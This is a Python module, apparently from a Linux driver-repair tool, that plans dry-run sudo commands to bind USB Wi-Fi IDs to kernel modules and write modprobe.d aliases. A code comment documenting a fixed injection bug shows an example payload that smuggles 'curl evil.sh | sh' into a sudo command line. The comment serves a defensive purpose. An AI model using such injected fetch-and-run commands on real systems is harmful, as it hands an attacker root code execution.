"""Dry-run repair planner for diagnosis state B (SPEC §23).

The planner NEVER executes anything: commands are display-only strings,
every plan carries WHAT/WHY/SOURCE/EVIDENCE/CONFIDENCE/FILES/COMMANDS/
ROLLBACK, and feasibility follows data/chipsets.json (rtl8xxxu refuses
dynamic ids per docs/research/realtek.md §1 — diagnosed, never forced).
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass, field

from ..types import Confidence, Evidence, require_module_name
from .transaction import create_transaction


@dataclass(frozen=True)
class Plan:
    what: str
    why: str
    source: str
    evidence: tuple[Evidence, ...]
    confidence: Confidence
    files_affected: list[str]
    commands: list[str]
    rollback: str
    feasible: bool = True
    executed: bool = False
    requires_root: bool = True
    safe_for_automation: bool = False
    transaction: object | None = None
    persistence_content: str | None = None
    official_origin: str | None = None


EMPTY_PLAN = Plan(
    what="nothing to do",
    why="no plan produced",
    source="-",
    evidence=(),
    confidence=Confidence.UNKNOWN,
    files_affected=[],
    commands=[],
    rollback="-",
    feasible=False,
)


def _alias_line(vid: str, pid: str, module: str) -> str:
    return (
        f"alias usb:v{vid.upper()}p{pid.upper()}d*dc*dsc*dp*icFFiscFFip00in* "
        f"{module}\n"
    )


def _find_entry(kb: dict, vid: str, pid: str) -> dict | None:
    target = f"{vid.lower()}:{pid.lower()}"
    for entry in kb.get("chipsets", []):
        ids = [str(i).lower() for i in entry.get("usb_ids", [])]
        if target in ids:
            return entry
    return None


def plan_state_b(
    *,
    device,
    kb: dict,
    bound_driver: str | None = None,
    loaded_module: str | None = None,
) -> Plan:
    vid, pid = device.vid, device.pid
    entry = _find_entry(kb, vid, pid)

    if entry is None:
        return Plan(
            what=f"identify chipset {vid}:{pid}",
            why=(
                "chipset not present in the knowledge base; refusing to guess "
                "(SPEC §11: manual identification remains available)"
            ),
            source="data/chipsets.json",
            evidence=(
                Evidence(
                    source="chipsets.json",
                    detail=f"{vid}:{pid} has no claiming entry",
                ),
            ),
            confidence=Confidence.UNKNOWN,
            files_affected=[],
            commands=[],
            rollback="-",
            feasible=False,
            requires_root=False,
        )

    if not entry.get("new_id_feasible", False):
        notes = entry.get("notes") or ".no_dynamic_id = 1 blocks dynamic binding"
        return Plan(
            what=f"diagnose unbound ID {vid}:{pid} ({entry['chipset']})",
            why=(
                f"in-tree driver claims the chipset but rejects dynamic IDs "
                f"({notes}); no legitimate local fix exists"
            ),
            source="docs/research/realtek.md §1 (source-verified)",
            evidence=(
                Evidence(
                    source="chipsets.json",
                    detail=f"{entry['chipset']}: new_id_feasible=false",
                ),
            ),
            confidence=Confidence(entry.get("confidence", "HIGH_CONFIDENCE")),
            files_affected=[],
            commands=[],
            rollback="-",
            feasible=False,
            requires_root=False,
            official_origin=(
                "vendor reference driver channel (OEM/Windows Update/distro "
                "kernel request); the tool points, never forces"
            ),
        )

    module = (
        bound_driver
        or loaded_module
        or entry.get("preferred_module")
        or (entry.get("new_id_modules") or [None])[0]
    )
    if not module:
        raise ValueError("feasible chipset without any candidate module")

    # VALIDACAO OBRIGATORIA ANTES DE MONTAR COMANDO (ADR 0002 S1/S3/S6).
    #
    # `module` chega de tres origens NAO CONFIAVEIS: bound_driver e
    # loaded_module vem do sysfs do host, e preferred_module/new_id_modules vem
    # do JSON da base de conhecimento. Nenhuma delas era validada, e o valor era
    # interpolado direto em strings de shell montadas logo abaixo — inclusive
    # dentro de aspas simples e de um caminho.
    #
    # Uma aspa simples no nome escapava do quoting e emendava comando arbitrario
    # numa linha que o proprio produto manda o usuario rodar com sudo:
    #
    #   echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
    #
    # `require_module_name` ja existia e simplesmente nao era chamada aqui.
    module = require_module_name(module)

    conf_path = f"/etc/modprobe.d/ddr-{vid}-{pid}.conf"
    alias = _alias_line(vid, pid, module)
    content_sha = hashlib.sha256(alias.encode()).hexdigest()
    commands = [
        f"echo '{vid} {pid}' | sudo tee /sys/bus/usb/drivers/{module}/new_id",
        (
            f"printf '# ddr state-B bind {vid} {pid}\\n%s\\n' "
            f"'{alias.strip()}' | sudo tee -a {conf_path}"
        ),
    ]
    transaction = create_transaction(
        before={
            "kind": "modprobe_d_file",
            "path": conf_path,
            "existed": False,
            "sha256": None,
        },
        change={"op": "create_modprobe_alias", "content": alias},
        after={
            "kind": "modprobe_d_file",
            "path": conf_path,
            "existed": True,
            "content_sha256": content_sha,
        },
        rollback_action={
            "op": "remove_file",
            "path": conf_path,
            "restore_if_existed": {"sha256": None},
        },
    )
    return Plan(
        what=(
            f"bind {vid}:{pid} to {module} via new_id and persist the "
            f"modprobe.d alias"
        ),
        why=(
            f"{module} claims chipset {entry['chipset']} and accepts dynamic "
            f"IDs; the device ID is simply missing from its table (state B)"
        ),
        source="modules.alias + data/chipsets.json",
        evidence=(
            Evidence(
                source="chipsets.json",
                detail=(
                    f"{entry['chipset']}: modules={entry.get('modules')}, "
                    f"new_id_feasible=true"
                ),
            ),
        ),
        confidence=Confidence(entry.get("confidence", "PROBABLE")),
        files_affected=[conf_path],
        commands=commands,
        rollback=(
            f"remove {conf_path} (guarded, idempotent) and reload the module; "
            f"the new_id binding is volatile and dies with the reboot"
        ),
        feasible=True,
        transaction=transaction,
        persistence_content=alias,
        official_origin=None,
    )
